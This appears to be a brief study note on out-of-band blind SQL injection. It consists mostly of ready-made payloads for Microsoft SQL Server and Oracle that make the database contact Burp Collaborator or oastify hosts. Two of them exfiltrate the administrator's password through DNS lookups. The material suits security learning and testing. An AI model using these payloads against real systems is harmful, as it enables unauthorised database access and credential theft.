# OAST - out of band - on Blind SQLi

SQL query asynchronously. The app processes user request, and uses another thread for SQL query.

Can use protocols like DNS

Can use collaborator

### Example in Microsoft SQL Server:
`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

### Example ORACLE
Needs URL encoding before sending(depends on situation, not a rule)

`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://sc85mhvia0bia1w4uyop1rt1vs1jp9dy.oastify.com/"> %remote;]>'),'/l') FROM dual--`

### Another example in Oracle:

`' UNION SELECT (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator') || '.sc85mhvia0bia1w4uyop1rt1vs1jp9dy.oastify.com') FROM dual) FROM dual--`

### To exiltrate data in Microsoft SQL Server:

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

